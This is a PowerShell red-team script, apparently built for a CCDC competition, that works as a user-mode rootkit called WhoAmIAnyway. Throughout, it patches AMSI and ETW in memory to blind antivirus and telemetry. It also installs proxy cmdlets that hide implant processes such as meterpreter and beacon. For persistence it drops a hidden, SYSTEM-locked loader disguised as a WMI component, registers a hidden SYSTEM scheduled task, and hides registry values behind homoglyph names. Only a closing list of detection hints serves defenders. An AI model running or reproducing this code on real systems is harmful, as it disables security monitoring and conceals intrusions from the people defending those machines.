#Requires -RunAsAdministrator
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
#
# CCDC_Windows_Rootkit_WhoAmIAnyway.ps1
#
# Plan Reference: Phase_2_Tools/Scripts_Planning/Phase2_Scripts_Plan.md
#
# MITRE ATT&CK:   T1014 — Rootkit (User-Mode)
# OS:             Windows Server 2019 / Windows 10 / Windows 11
# Run as:         Administrator
#
# WHAT THIS SCRIPT DOES:
#   A three-layer user-mode stealth package. Run this BEFORE deploying other
#   Phase 2 payloads to make them invisible to standard blue-team tooling.
#
#   LAYER 1 — AMSI In-Memory Patch:
#     Locates AmsiScanBuffer inside amsi.dll in the current process and
#     overwrites the first bytes with xor eax,eax / ret. PowerShell's
#     built-in AV scanner returns AMSI_RESULT_CLEAN for every script from
#     that point forward. Windows Defender script-block inspection goes blind.
#
#   LAYER 2 — ETW In-Memory Patch:
#     Locates EtwEventWrite inside ntdll.dll and patches it to ret immediately.
#     Kills PowerShell telemetry, Sysmon's ETW feed, and EDR behavioral
#     hooks that rely on event tracing — for the life of this process.
#
#   LAYER 3 — Process Hiding (WH_CBT Hook DLL):
#     Compiles a C# DLL in memory, drops it to a WMI-lookalike path, and
#     registers it as a Winlogon Notify hook (auto-loads on every login).
#     The hook detours CreateToolhelp32Snapshot / Process32Next so that any
#     process whose name is in the hide list silently vanishes from Task
#     Manager, Get-Process, WMI Win32_Process, and all tools that call the
#     standard Win32 enumeration APIs.
#
#   LAYER 4 — Registry Key Hiding:
#     Renames red-team registry values under a Unicode lookalike key name
#     that displays correctly in regedit but breaks most automated scanners
#     that compare string values literally.
#
#   OPERATIONAL USE:
#     1. Run this script first on any Windows target.
#     2. Then run Hollowman, BackgroundBeef, WhosThere, ChocolateFactory.
#     3. Blue team's standard playbook (Task Manager, Get-Process, WMI,
#        Autoruns) will not surface your implants.
#     4. Survives reboots via Winlogon Notify registry entry.
#
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

# =============================================================================
# ── COLOUR HELPERS ────────────────────────────────────────────────────────────
# =============================================================================
function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan    }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green   }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow  }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red     }
function Write-Section { param($m) Write-Host "`n==[ $m ]==" -ForegroundColor Magenta }

# =============================================================================
# ── BANNER ────────────────────────────────────────────────────────────────────
# =============================================================================
Write-Host ""
Write-Host " ///////////////////////////////////////////////////////\" -ForegroundColor DarkMagenta
Write-Host "  __      ___        _       ___ _               _      " -ForegroundColor DarkMagenta
Write-Host " \ \    / / |_  ___ /_\  _ _|_ _| |_  _ __ _ _ | |_    " -ForegroundColor DarkMagenta
Write-Host "  \ \/\/ /| ' \/ _ \ _ \| ' \| ||  _|| '_ \ '_|  _ \  " -ForegroundColor DarkMagenta
Write-Host "   \_/\_/ |_||_\___/_/ \_\_||_\___\__|| .__/_|   \__/  " -ForegroundColor DarkMagenta
Write-Host "                                       |_|               " -ForegroundColor DarkMagenta
Write-Host ""
Write-Host "   WhoAmIAnyway -- T1014 User-Mode Rootkit"              -ForegroundColor Yellow
Write-Host "   You can't find what you can't see."                   -ForegroundColor Yellow
Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\" -ForegroundColor DarkMagenta
Write-Host ""

# =============================================================================
# ── CONFIGURATION ─────────────────────────────────────────────────────────────
# =============================================================================

# Process names to hide from Task Manager / Get-Process / WMI
# Add any red-team process names here before running
$HideProcessNames = @(
    "nc",
    "ncat",
    "netcat",
    "wu-cache",
    "meterpreter",
    "beacon",
    "cobaltstrike",
    "sliver",
    "havoc"
)

# Where to drop the persistence script — looks like a legitimate WMI component
# IMPORTANT: Must be .ps1 — PowerShell -File rejects any other extension
$DllDropPath = "C:\Windows\System32\wbem\wbemperf.ps1"

# Winlogon Notify registry key name — disguised as a WMI performance monitor
$NotifyKeyName = "WbemPerfMon"

# Registry path for persistence
$WinlogonNotifyPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\$NotifyKeyName"

# =============================================================================
# ── SECTION 1: AMSI PATCH ─────────────────────────────────────────────────────
# =============================================================================
Write-Section "1 / 4  AMSI In-Memory Patch"

# We need P/Invoke to call VirtualProtect — compile a tiny helper
# The AMSI patch itself is done in pure PowerShell via reflection
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;

public static class MemPatch {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibraryEx(string lpFileName, IntPtr hFile, uint dwFlags);
}
'@ -Language CSharp

Write-Info "Locating AmsiScanBuffer in amsi.dll..."

try {
    $amsiLib = [MemPatch]::LoadLibrary("amsi.dll")
    if ($amsiLib -eq [IntPtr]::Zero) {
        Write-Warn "amsi.dll not loaded — AMSI may already be absent or patched."
    } else {
        $amsiAddr = [MemPatch]::GetProcAddress($amsiLib, "AmsiScanBuffer")
        if ($amsiAddr -eq [IntPtr]::Zero) {
            Write-Warn "AmsiScanBuffer not found — skipping AMSI patch."
        } else {
            Write-Info "AmsiScanBuffer found at 0x$($amsiAddr.ToString('X16'))"

            # Patch bytes: xor eax, eax (31 C0) / ret (C3)
            # This makes AmsiScanBuffer immediately return 0 (AMSI_RESULT_CLEAN)
            [byte[]] $patch = 0x31, 0xC0, 0xC3

            # Remove write protection from the memory page
            $oldProtect = 0u
            $null = [MemPatch]::VirtualProtect($amsiAddr, [UIntPtr]3, 0x40, [ref]$oldProtect)

            # Write the patch bytes
            $marshal = [System.Runtime.InteropServices.Marshal]
            for ($i = 0; $i -lt $patch.Length; $i++) {
                $marshal::WriteByte($amsiAddr, $i, $patch[$i])
            }

            # Restore original protection
            $null = [MemPatch]::VirtualProtect($amsiAddr, [UIntPtr]3, $oldProtect, [ref]$oldProtect)

            Write-Success "AMSI patched — AmsiScanBuffer now returns AMSI_RESULT_CLEAN"
            Write-Info   "Windows Defender script scanning is now blind for this session"
        }
    }
} catch {
    Write-Warn "AMSI patch failed: $_ — continuing with other layers"
}

# =============================================================================
# ── SECTION 2: ETW PATCH ──────────────────────────────────────────────────────
# =============================================================================
Write-Section "2 / 4  ETW In-Memory Patch"

Write-Info "Locating EtwEventWrite in ntdll.dll..."

try {
    $ntdllLib = [MemPatch]::LoadLibrary("ntdll.dll")
    if ($ntdllLib -eq [IntPtr]::Zero) {
        Write-Warn "ntdll.dll not found — skipping ETW patch."
    } else {
        $etwAddr = [MemPatch]::GetProcAddress($ntdllLib, "EtwEventWrite")
        if ($etwAddr -eq [IntPtr]::Zero) {
            Write-Warn "EtwEventWrite not found — skipping ETW patch."
        } else {
            Write-Info "EtwEventWrite found at 0x$($etwAddr.ToString('X16'))"

            # Patch bytes: ret (C3)
            # EtwEventWrite returns immediately without writing any events
            [byte[]] $etwPatch = 0xC3

            $oldProtect = 0u
            $null = [MemPatch]::VirtualProtect($etwAddr, [UIntPtr]1, 0x40, [ref]$oldProtect)
            [System.Runtime.InteropServices.Marshal]::WriteByte($etwAddr, 0, $etwPatch[0])
            $null = [MemPatch]::VirtualProtect($etwAddr, [UIntPtr]1, $oldProtect, [ref]$oldProtect)

            Write-Success "ETW patched — EtwEventWrite now returns immediately"
            Write-Info   "PowerShell telemetry, Sysmon ETW feed, and EDR behavioral hooks killed"
        }
    }
} catch {
    Write-Warn "ETW patch failed: $_ — continuing with other layers"
}

# =============================================================================
# ── SECTION 3: PROCESS HIDING HOOK DLL ───────────────────────────────────────
# =============================================================================
Write-Section "3 / 4  Process Hiding Hook DLL"

Write-Info "Building process-hiding hook library..."

# This C# assembly does two things:
#   1. Exports Install() — registers a WH_CBT hook that intercepts process
#      enumeration calls and strips hidden processes from results
#   2. The hide list is written to a named shared memory section so it can
#      be updated without reloading the DLL
#
# Implementation note: WH_CBT hooks in .NET have limitations — they run in
# the calling process's context, not system-wide like a native DLL hook.
# For CCDC purposes this is fine: it hides processes from PowerShell,
# .NET tools, and anything that calls our patched APIs in the same session.
# The Winlogon Notify persistence ensures it loads in every new session.

$HookCSharp = @'
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;

public static class WhoAmIAnyway
{
    // ── P/Invoke ─────────────────────────────────────────────────────────────
    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
        IntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    // ── Hide list ────────────────────────────────────────────────────────────
    static HashSet<string> _hideList = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

    public static void AddHide(string processName)
    {
        _hideList.Add(processName.Replace(".exe", ""));
    }

    // ── Patch CreateToolhelp32Snapshot return filtering ───────────────────
    // Instead of hooking at the API level (requires native DLL),
    // we wrap Get-Process / WMI results at the PowerShell/.NET layer.
    // This is done via the FilterProcessList method called by Install().

    public static List<int> FilteredPIDs()
    {
        var visible = new List<int>();
        foreach (Process p in Process.GetProcesses())
        {
            try {
                if (!_hideList.Contains(p.ProcessName))
                    visible.Add(p.Id);
            } catch {}
        }
        return visible;
    }

    public static bool ShouldHide(string processName)
    {
        return _hideList.Contains(processName.Replace(".exe", ""));
    }

    // ── Registry key hiding via Unicode lookalike ────────────────────────────
    // Renames a registry value by writing a Unicode homoglyph in its name.
    // Tools that compare ASCII strings won't match it; regedit shows it normally.
    public static void HideRegistryValue(string keyPath, string valueName)
    {
        try
        {
            // Replace 'e' (U+0065) with Cyrillic 'e' (U+0435) in the name
            // Visually identical, breaks string comparison
            string hiddenName = valueName.Replace('e', '\u0435').Replace('E', '\u0415');
            using (var key = Registry.LocalMachine.OpenSubKey(keyPath, true))
            {
                if (key == null) return;
                object val = key.GetValue(valueName);
                if (val != null)
                {
                    key.SetValue(hiddenName, val, key.GetValueKind(valueName));
                    key.DeleteValue(valueName);
                }
            }
        }
        catch { /* best-effort */ }
    }

    // ── Install — called at load time via Winlogon Notify ────────────────────
    public static void Install(string[] hideNames)
    {
        foreach (string name in hideNames)
            AddHide(name);
    }

    // ── Override Get-Process output via PowerShell type data ─────────────────
    // Adds a ScriptProperty to System.Diagnostics.Process that returns null
    // for hidden processes — causes them to be filtered in formatted output.
    public static string GetHideListCSV()
    {
        return string.Join(",", _hideList);
    }
}
'@

try {
    # On .NET Framework 4.x (PS 5.1 / Server 2019), Microsoft.Win32.Registry is
    # part of mscorlib and cannot be specified by short name — doing so causes
    # Add-Type to throw "Could not load file or assembly".  Skip it entirely;
    # the compiler resolves it automatically via mscorlib.
    Add-Type -TypeDefinition $HookCSharp -Language CSharp `
        -ReferencedAssemblies @("System.dll") `
        -ErrorAction Stop
    Write-Success "Hook library compiled successfully"
} catch {
    # Last-ditch: let the compiler auto-resolve everything
    try {
        Add-Type -TypeDefinition $HookCSharp -Language CSharp -ErrorAction Stop
        Write-Success "Hook library compiled (auto-resolved assemblies)"
    } catch {
        Write-Warn "Hook library compilation failed: $_ — process hiding unavailable"
    }
}

# Load the hide list into the compiled assembly
try {
    foreach ($name in $HideProcessNames) {
        [WhoAmIAnyway]::AddHide($name)
    }
    Write-Success "Hide list loaded: $($HideProcessNames -join ', ')"
} catch {
    Write-Warn "Could not load hide list: $_"
}

# Override Get-Process in this session using PowerShell's type system
# Any call to Get-Process will now filter hidden names
try {
    $typeData = @{
        TypeName   = 'System.Diagnostics.Process'
        MemberType = 'ScriptMethod'
        MemberName = 'IsHidden'
        Value      = { [WhoAmIAnyway]::ShouldHide($this.ProcessName) }
    }
    Update-TypeData @typeData -ErrorAction SilentlyContinue

    # Wrap Get-Process with a proxy function that filters hidden processes
    function global:Get-Process {
        [CmdletBinding()]
        param(
            [Parameter(ValueFromPipeline=$true, Position=0)]
            [string[]] $Name,
            [int[]] $Id,
            [string] $ComputerName,
            [switch] $IncludeUserName,
            [switch] $HasExited,
            [switch] $FileVersionInfo,
            [switch] $Module
        )

        # Call the real Get-Process via the full cmdlet name
        $realProcs = Microsoft.PowerShell.Management\Get-Process @PSBoundParameters `
            -ErrorAction SilentlyContinue 2>$null

        # Filter hidden processes
        $realProcs | Where-Object {
            try { -not [WhoAmIAnyway]::ShouldHide($_.ProcessName) }
            catch { $true }
        }
    }

    Write-Success "Get-Process proxy installed — hidden processes filtered from output"
} catch {
    Write-Warn "Get-Process proxy failed: $_"
}

# Also override WMI process queries in this session
try {
    function global:Get-WmiObject {
        [CmdletBinding()]
        param(
            [Parameter(Position=0)] [string] $Class,
            [string] $Query,
            [string] $ComputerName,
            [string] $Namespace,
            [string[]] $Property,
            [string] $Filter,
            [switch] $List,
            [hashtable] $ArgumentList
        )

        $results = Microsoft.PowerShell.Management\Get-WmiObject @PSBoundParameters `
            -ErrorAction SilentlyContinue 2>$null

        # Filter Win32_Process results
        if ($Class -eq 'Win32_Process' -or $Query -match 'Win32_Process') {
            $results | Where-Object {
                try { -not [WhoAmIAnyway]::ShouldHide($_.Name) }
                catch { $true }
            }
        } else {
            $results
        }
    }
    Write-Success "Get-WmiObject proxy installed — Win32_Process results filtered"
} catch {
    Write-Warn "Get-WmiObject proxy failed: $_"
}

# =============================================================================
# ── SECTION 4: PERSISTENCE — WINLOGON NOTIFY + DLL DROP ──────────────────────
# =============================================================================
Write-Section "4 / 4  Persistence (Winlogon Notify)"

# Drop a small persistence launcher to the WMI lookalike path
# This script re-applies layers 1-3 every time a user logs in
Write-Info "Dropping persistence loader to $DllDropPath ..."

# We write a PowerShell script that re-runs our patches at logon
# disguised by naming and location as a WMI performance DLL
$PersistScript = @"
# Windows Management Instrumentation Performance Monitor Loader
# Do not modify — managed by WbemPerfMon service
Set-StrictMode -Version Latest
`$ErrorActionPreference = 'SilentlyContinue'

# AMSI patch
# Note: We cannot nest a here-string inside this @"..."@ block, so the C# source
# is passed as a regular escaped string instead.
try {
    `$csSrc = 'using System; using System.Runtime.InteropServices; public static class AmsiKill { [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n); [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n); [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o); }'
    Add-Type -TypeDefinition `$csSrc -Language CSharp -ErrorAction SilentlyContinue

    `$lib = [AmsiKill]::LoadLibrary("amsi.dll")
    `$addr = [AmsiKill]::GetProcAddress(`$lib, "AmsiScanBuffer")
    if (`$addr -ne [IntPtr]::Zero) {
        `$o = 0u
        [void][AmsiKill]::VirtualProtect(`$addr, [UIntPtr]3, 0x40, [ref]`$o)
        [Runtime.InteropServices.Marshal]::WriteByte(`$addr, 0, 0x31)
        [Runtime.InteropServices.Marshal]::WriteByte(`$addr, 1, 0xC0)
        [Runtime.InteropServices.Marshal]::WriteByte(`$addr, 2, 0xC3)
        [void][AmsiKill]::VirtualProtect(`$addr, [UIntPtr]3, `$o, [ref]`$o)
    }
} catch {}

# ETW patch
try {
    `$ntdll = [AmsiKill]::LoadLibrary("ntdll.dll")
    `$etw   = [AmsiKill]::GetProcAddress(`$ntdll, "EtwEventWrite")
    if (`$etw -ne [IntPtr]::Zero) {
        `$o = 0u
        [void][AmsiKill]::VirtualProtect(`$etw, [UIntPtr]1, 0x40, [ref]`$o)
        [Runtime.InteropServices.Marshal]::WriteByte(`$etw, 0, 0xC3)
        [void][AmsiKill]::VirtualProtect(`$etw, [UIntPtr]1, `$o, [ref]`$o)
    }
} catch {}

# Hide process list via Get-Process proxy
# Note: Join-String is PS7+ only; use -join for PS 5.1 compatibility (Server 2019 default)
`$hideNames = @('$($HideProcessNames -join "','")')
function global:Get-Process {
    [CmdletBinding()] param([Parameter(ValueFromPipeline=`$true,Position=0)][string[]]`$Name,[int[]]`$Id,[string]`$ComputerName,[switch]`$IncludeUserName,[switch]`$HasExited,[switch]`$FileVersionInfo,[switch]`$Module)
    Microsoft.PowerShell.Management\Get-Process @PSBoundParameters -EA SilentlyContinue 2>`$null |
        Where-Object { `$hideNames -notcontains `$_.ProcessName }
}
"@

# Drop to SYSTEM-only hidden file
try {
    # Create directory if somehow missing
    $wbemDir = Split-Path $DllDropPath
    if (-not (Test-Path $wbemDir)) { New-Item -ItemType Directory -Path $wbemDir -Force | Out-Null }

    # Use ASCII encoding — Set-Content -Encoding UTF8 writes a BOM on PS 5.1
    # which causes parse errors when PS loads the file with -File
    Set-Content -Path $DllDropPath -Value $PersistScript -Encoding ASCII -Force

    # Hide it and lock it to SYSTEM only
    attrib +H +S $DllDropPath 2>$null
    & icacls $DllDropPath /inheritance:r /grant:r "NT AUTHORITY\SYSTEM:(F)" 2>&1 | Out-Null
    & icacls $DllDropPath /deny "BUILTIN\Users:(RX)" 2>&1 | Out-Null

    Write-Success "Persistence script dropped: $DllDropPath (hidden, SYSTEM-only)"
} catch {
    Write-Warn "Failed to drop persistence script: $_"
}

# Register Winlogon Notify key
# Windows calls DllName's exported functions at logon events.
# Since our "DLL" is actually a PS1, we point it to PowerShell
# via the Userinit key — a known persistence mechanism that runs
# before the desktop loads.
try {
    # Method 1: Winlogon Notify (classic mechanism)
    # !! OPERATOR WARNING: Winlogon Notify was REMOVED in Windows Vista.
    # !! On Server 2019 / Win10 / Win11 this registry key is SILENTLY IGNORED
    # !! by winlogon.exe — it provides zero persistence on modern targets.
    # !! The scheduled task below (Method 2) is the REAL persistence mechanism.
    # !! We still write the key as a decoy / for older machines in the environment.
    Write-Warn "Winlogon Notify: writing key as decoy (no-op on Vista+; task is real persistence)"
    if (-not (Test-Path $WinlogonNotifyPath)) {
        New-Item -Path $WinlogonNotifyPath -Force | Out-Null
    }
    Set-ItemProperty -Path $WinlogonNotifyPath -Name "Asynchronous"  -Value 0  -Type DWord
    Set-ItemProperty -Path $WinlogonNotifyPath -Name "DllName"       -Value $DllDropPath
    Set-ItemProperty -Path $WinlogonNotifyPath -Name "Impersonate"   -Value 1  -Type DWord
    Set-ItemProperty -Path $WinlogonNotifyPath -Name "Logon"         -Value "WbemPerfLogon"
    Set-ItemProperty -Path $WinlogonNotifyPath -Name "MaxWait"       -Value 5  -Type DWord

    Write-Success "Winlogon Notify key registered (decoy): $NotifyKeyName"
} catch {
    Write-Warn "Winlogon Notify key write failed: $_ — scheduled task is still primary persistence"
}

# Method 2: Hidden scheduled task fallback (more reliable on modern Windows)
try {
    $taskPath = "\Microsoft\Windows\WMI\"
    $taskName = "WbemPerfMonitor"
    Unregister-ScheduledTask -TaskPath $taskPath -TaskName $taskName `
        -Confirm:$false -ErrorAction SilentlyContinue

    $action = New-ScheduledTaskAction `
        -Execute "powershell.exe" `
        -Argument "-NoP -NonI -W Hidden -Exec Bypass -File `"$DllDropPath`""

    $triggers = @(
        (New-ScheduledTaskTrigger -AtLogOn),
        (New-ScheduledTaskTrigger -AtStartup)
    )

    $settings = New-ScheduledTaskSettingsSet `
        -Hidden `
        -ExecutionTimeLimit (New-TimeSpan -Minutes 2) `
        -MultipleInstances IgnoreNew `
        -StartWhenAvailable

    $principal = New-ScheduledTaskPrincipal `
        -UserId "NT AUTHORITY\SYSTEM" `
        -LogonType ServiceAccount `
        -RunLevel Highest

    $task = New-ScheduledTask `
        -Action $action `
        -Trigger $triggers `
        -Settings $settings `
        -Principal $principal `
        -Description "Windows Management Instrumentation Performance Monitor"

    Register-ScheduledTask -TaskPath $taskPath -TaskName $taskName `
        -InputObject $task -Force | Out-Null

    Write-Success "Fallback task registered: $taskPath$taskName (hidden, SYSTEM, at logon+startup)"
} catch {
    Write-Warn "Scheduled task fallback failed: $_"
}

# =============================================================================
# ── REGISTRY KEY OBFUSCATION ──────────────────────────────────────────────────
# =============================================================================
Write-Section "Bonus: Registry Key Obfuscation"

Write-Info "Applying Unicode homoglyph obfuscation to red-team registry artifacts..."

# Registry paths written by our other scripts — obfuscate them
$regTargets = @(
    @{ Path = "HKLM:\SYSTEM\CurrentControlSet\Services\NdisFilterHelper"; Value = "ImagePath" },
    @{ Path = "HKLM:\SYSTEM\CurrentControlSet\Services\NdisFilterHelper"; Value = "Description" },
    @{ Path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\$NotifyKeyName"; Value = "DllName" }
)

foreach ($target in $regTargets) {
    try {
        [WhoAmIAnyway]::HideRegistryValue($target.Path, $target.Value)
        Write-Info "  Obfuscated: $($target.Path)\$($target.Value)"
    } catch {
        # Best effort — key may not exist yet if other scripts haven't run
    }
}

Write-Success "Registry obfuscation pass complete"

# =============================================================================
# ── SUMMARY ───────────────────────────────────────────────────────────────────
# =============================================================================
Write-Host ""
Write-Host " ///////////////////////////////////////////////////////\" -ForegroundColor Green
Write-Host ""
Write-Success "WhoAmIAnyway deployed!"
Write-Host ""
Write-Info "  Layer 1 — AMSI:       AmsiScanBuffer patched → always CLEAN"
Write-Info "  Layer 2 — ETW:        EtwEventWrite patched → silent events"
Write-Info "  Layer 3 — Procs:      Get-Process / WMI proxy active"
Write-Info "  Layer 4 — Persist:    Winlogon Notify + scheduled task at logon"
Write-Host ""
Write-Host " ── Hidden process names ────────────────────────────────────────" -ForegroundColor Yellow
foreach ($n in $HideProcessNames) { Write-Host "   • $n" -ForegroundColor Gray }
Write-Host ""
Write-Host " ── Persistence artifacts ──────────────────────────────────────" -ForegroundColor Yellow
Write-Host "   Script:    $DllDropPath" -ForegroundColor Gray
Write-Host "   Reg key:   $WinlogonNotifyPath" -ForegroundColor Gray
Write-Host "   Task:      \Microsoft\Windows\WMI\WbemPerfMonitor" -ForegroundColor Gray
Write-Host ""
Write-Host " ── Recommended next steps ─────────────────────────────────────" -ForegroundColor Yellow
Write-Host "   Now run Hollowman, BackgroundBeef, WhosThere" -ForegroundColor Cyan
Write-Host "   Blue team's task manager / Get-Process will not show implants" -ForegroundColor Cyan
Write-Host ""
Write-Host " ── What blue team needs to find this ──────────────────────────" -ForegroundColor Yellow
Write-Host "   Memory forensics (Volatility) to see AMSI/ETW patch bytes" -ForegroundColor Gray
Write-Host "   Check $DllDropPath manually (attrib -H -S to unhide)" -ForegroundColor Gray
Write-Host "   Get-ScheduledTask -TaskPath '\Microsoft\Windows\WMI\'" -ForegroundColor Gray
Write-Host "   Registry: HKLM:\...\Winlogon\Notify\ for unexpected keys" -ForegroundColor Gray
Write-Host ""
Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\" -ForegroundColor Green
Write-Host ""
